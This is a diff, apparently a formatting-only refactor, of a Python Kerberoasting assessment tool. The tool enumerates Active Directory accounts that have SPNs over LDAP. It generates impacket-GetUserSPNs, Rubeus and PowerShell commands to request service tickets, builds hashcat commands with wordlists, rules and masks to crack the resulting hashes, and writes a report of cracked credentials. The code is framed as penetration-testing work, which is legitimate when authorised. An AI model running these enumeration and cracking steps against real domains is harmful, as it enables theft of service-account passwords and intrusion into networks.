@@ -33,7 +33,9 @@ except ImportError:
 console = Console()
 
 
-def enumerate_spn_accounts(domain: str, dc_ip: str, username: str, password: str, use_hash: bool = False) -> list[dict]:
+def enumerate_spn_accounts(
+    domain: str, dc_ip: str, username: str, password: str, use_hash: bool = False
+) -> list[dict]:
     """Enumerate domain accounts with SPNs set via LDAP."""
     accounts = []
 
@@ -67,7 +69,9 @@ def enumerate_spn_accounts(domain: str, dc_ip: str, username: str, password: str
             console.print(f"[red][-] LDAP bind failed: {conn.last_error}[/red]")
             return accounts
 
-        console.print(f"[green][+] Connected to {dc_ip} as {domain}\\{username}[/green]")
+        console.print(
+            f"[green][+] Connected to {dc_ip} as {domain}\\{username}[/green]"
+        )
 
         # Search for user accounts with SPNs
         search_filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
@@ -91,21 +95,39 @@ def enumerate_spn_accounts(domain: str, dc_ip: str, username: str, password: str
 
         for entry in conn.entries:
             account = {
-                "samaccountname": str(entry.sAMAccountName) if hasattr(entry, "sAMAccountName") else "",
-                "spn": [str(spn) for spn in entry.servicePrincipalName] if hasattr(entry, "servicePrincipalName") else [],
-                "memberof": [str(g) for g in entry.memberOf] if hasattr(entry, "memberOf") else [],
-                "admincount": str(entry.adminCount) if hasattr(entry, "adminCount") else "0",
-                "pwdlastset": str(entry.pwdLastSet) if hasattr(entry, "pwdLastSet") else "",
-                "lastlogon": str(entry.lastLogon) if hasattr(entry, "lastLogon") else "",
-                "description": str(entry.description) if hasattr(entry, "description") else "",
-                "dn": str(entry.distinguishedName) if hasattr(entry, "distinguishedName") else "",
+                "samaccountname": str(entry.sAMAccountName)
+                if hasattr(entry, "sAMAccountName")
+                else "",
+                "spn": [str(spn) for spn in entry.servicePrincipalName]
+                if hasattr(entry, "servicePrincipalName")
+                else [],
+                "memberof": [str(g) for g in entry.memberOf]
+                if hasattr(entry, "memberOf")
+                else [],
+                "admincount": str(entry.adminCount)
+                if hasattr(entry, "adminCount")
+                else "0",
+                "pwdlastset": str(entry.pwdLastSet)
+                if hasattr(entry, "pwdLastSet")
+                else "",
+                "lastlogon": str(entry.lastLogon)
+                if hasattr(entry, "lastLogon")
+                else "",
+                "description": str(entry.description)
+                if hasattr(entry, "description")
+                else "",
+                "dn": str(entry.distinguishedName)
+                if hasattr(entry, "distinguishedName")
+                else "",
             }
             accounts.append(account)
 
         conn.unbind()
 
     except ImportError:
-        console.print("[yellow][!] ldap3 not installed. Install with: pip install ldap3[/yellow]")
+        console.print(
+            "[yellow][!] ldap3 not installed. Install with: pip install ldap3[/yellow]"
+        )
         console.print("[yellow][!] Falling back to demonstration mode...[/yellow]")
     except Exception as e:
         console.print(f"[red][-] LDAP enumeration failed: {e}[/red]")
@@ -113,30 +135,46 @@ def enumerate_spn_accounts(domain: str, dc_ip: str, username: str, password: str
     return accounts
 
 
-def request_tgs_tickets(domain: str, dc_ip: str, username: str, password: str, target_users: list[str] | None = None) -> str:
+def request_tgs_tickets(
+    domain: str,
+    dc_ip: str,
+    username: str,
+    password: str,
+    target_users: list[str] | None = None,
+) -> str:
     """Request TGS tickets for SPN accounts using Impacket."""
     try:
         from impacket.krb5.types import Principal
         import impacket.krb5.asn1
 
         console.print("[yellow][*] Requesting TGS tickets via Impacket...[/yellow]")
-        console.print(f"[yellow][*] Use impacket-GetUserSPNs for production usage:[/yellow]")
-        console.print(f"[cyan]impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt[/cyan]")
+        console.print(
+            "[yellow][*] Use impacket-GetUserSPNs for production usage:[/yellow]"
+        )
+        console.print(
+            f"[cyan]impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt[/cyan]"
+        )
 
         return f"impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt"
 
     except ImportError:
-        console.print("[yellow][!] Impacket not installed. Generating command for manual execution.[/yellow]")
+        console.print(
+            "[yellow][!] Impacket not installed. Generating command for manual execution.[/yellow]"
+        )
 
         commands = []
         # Generate Impacket command
-        commands.append(f"# Impacket GetUserSPNs (Linux)")
-        commands.append(f"impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt")
+        commands.append("# Impacket GetUserSPNs (Linux)")
+        commands.append(
+            f"impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt"
+        )
         commands.append("")
 
         # Generate Rubeus command
         commands.append("# Rubeus (Windows)")
-        commands.append(f".\\Rubeus.exe kerberoast /domain:{domain} /dc:{dc_ip} /outfile:kerberoast.txt")
+        commands.append(
+            f".\\Rubeus.exe kerberoast /domain:{domain} /dc:{dc_ip} /outfile:kerberoast.txt"
+        )
         commands.append("")
 
         # Generate PowerShell command
@@ -144,7 +182,9 @@ def request_tgs_tickets(domain: str, dc_ip: str, username: str, password: str, t
         commands.append("Add-Type -AssemblyName System.IdentityModel")
         if target_users:
             for user in target_users:
-                commands.append(f'# New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "{user}"')
+                commands.append(
+                    f'# New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "{user}"'
+                )
 
         return "\n".join(commands)
 
@@ -152,22 +192,22 @@ def request_tgs_tickets(domain: str, dc_ip: str, username: str, password: str, t
 def generate_hashcat_commands(hash_file: str) -> list[str]:
     """Generate hashcat commands for cracking Kerberoast hashes."""
     commands = [
-        f"# RC4 (etype 23) - Most common",
+        "# RC4 (etype 23) - Most common",
         f"hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
         "",
-        f"# AES-128 (etype 17)",
+        "# AES-128 (etype 17)",
         f"hashcat -m 19700 {hash_file} /usr/share/wordlists/rockyou.txt",
         "",
-        f"# AES-256 (etype 18)",
+        "# AES-256 (etype 18)",
         f"hashcat -m 19800 {hash_file} /usr/share/wordlists/rockyou.txt",
         "",
-        f"# Mask attack for common patterns (Season+Year+Special)",
+        "# Mask attack for common patterns (Season+Year+Special)",
         f"hashcat -m 13100 {hash_file} -a 3 '?u?l?l?l?l?l?d?d?d?d?s'",
         "",
-        f"# Combined wordlist + rules",
+        "# Combined wordlist + rules",
         f"hashcat -m 13100 {hash_file} wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule",
         "",
-        f"# Show cracked passwords",
+        "# Show cracked passwords",
         f"hashcat -m 13100 {hash_file} --show",
     ]
     return commands
@@ -216,10 +256,15 @@ def analyze_hash_file(hash_file: str) -> dict:
     return stats
 
 
-def generate_report(accounts: list[dict], hash_stats: dict | None, cracked: list[dict] | None, output_path: str):
+def generate_report(
+    accounts: list[dict],
+    hash_stats: dict | None,
+    cracked: list[dict] | None,
+    output_path: str,
+):
     """Generate Kerberoasting assessment report."""
     report = f"""# Kerberoasting Assessment Report
-## Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+## Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 
 ---
 
@@ -243,14 +288,14 @@ Kerberoasting assessment identified **{len(accounts)}** domain accounts with Ser
 
 | Metric | Value |
 |--------|-------|
-| Total Hashes | {hash_stats['total_hashes']} |
-| RC4 (etype 23) | {hash_stats['rc4_hashes']} |
-| AES-128 (etype 17) | {hash_stats['aes128_hashes']} |
-| AES-256 (etype 18) | {hash_stats['aes256_hashes']} |
+| Total Hashes | {hash_stats["total_hashes"]} |
+| RC4 (etype 23) | {hash_stats["rc4_hashes"]} |
+| AES-128 (etype 17) | {hash_stats["aes128_hashes"]} |
+| AES-256 (etype 18) | {hash_stats["aes256_hashes"]} |
 """
 
     if cracked:
-        report += f"""
+        report += """
 ## 4. Cracked Credentials
 
 | Account | Password Strength | Admin | Impact |
@@ -297,23 +342,35 @@ def main():
     parser.add_argument("--dc-ip", help="Domain Controller IP")
     parser.add_argument("--username", help="Domain username")
     parser.add_argument("--password", help="Password or NTLM hash")
-    parser.add_argument("--enumerate", action="store_true", help="Enumerate SPN accounts")
+    parser.add_argument(
+        "--enumerate", action="store_true", help="Enumerate SPN accounts"
+    )
     parser.add_argument("--kerberoast", action="store_true", help="Request TGS tickets")
     parser.add_argument("--analyze-hashes", help="Path to hash file to analyze")
     parser.add_argument("--cracked", help="Path to cracked results file")
-    parser.add_argument("--output", default="./kerberoast_report.md", help="Output path")
-    parser.add_argument("--generate-commands", action="store_true", help="Generate hashcat commands")
+    parser.add_argument(
+        "--output", default="./kerberoast_report.md", help="Output path"
+    )
+    parser.add_argument(
+        "--generate-commands", action="store_true", help="Generate hashcat commands"
+    )
 
     args = parser.parse_args()
     accounts = []
 
     if args.enumerate:
         if not all([args.domain, args.dc_ip, args.username, args.password]):
-            console.print("[red][-] --domain, --dc-ip, --username, --password required[/red]")
+            console.print(
+                "[red][-] --domain, --dc-ip, --username, --password required[/red]"
+            )
             return
 
-        console.print(f"[yellow][*] Enumerating SPN accounts in {args.domain}...[/yellow]")
-        accounts = enumerate_spn_accounts(args.domain, args.dc_ip, args.username, args.password)
+        console.print(
+            f"[yellow][*] Enumerating SPN accounts in {args.domain}...[/yellow]"
+        )
+        accounts = enumerate_spn_accounts(
+            args.domain, args.dc_ip, args.username, args.password
+        )
 
         if accounts:
             table = Table(title=f"Kerberoastable Accounts in {args.domain}")
@@ -331,14 +388,20 @@ def main():
                 )
             console.print(table)
         else:
-            console.print("[yellow][!] No Kerberoastable accounts found (or enumeration failed)[/yellow]")
+            console.print(
+                "[yellow][!] No Kerberoastable accounts found (or enumeration failed)[/yellow]"
+            )
 
     if args.kerberoast:
         if not all([args.domain, args.dc_ip, args.username, args.password]):
-            console.print("[red][-] --domain, --dc-ip, --username, --password required[/red]")
+            console.print(
+                "[red][-] --domain, --dc-ip, --username, --password required[/red]"
+            )
             return
 
-        commands = request_tgs_tickets(args.domain, args.dc_ip, args.username, args.password)
+        commands = request_tgs_tickets(
+            args.domain, args.dc_ip, args.username, args.password
+        )
         console.print(Panel(commands, title="Kerberoasting Commands"))
 
     if args.analyze_hashes:
@@ -359,7 +422,9 @@ def main():
 
     # Generate report if we have data
     if accounts or args.analyze_hashes:
-        hash_stats = analyze_hash_file(args.analyze_hashes) if args.analyze_hashes else None
+        hash_stats = (
+            analyze_hash_file(args.analyze_hashes) if args.analyze_hashes else None
+        )
         generate_report(accounts, hash_stats, None, args.output)
 
 
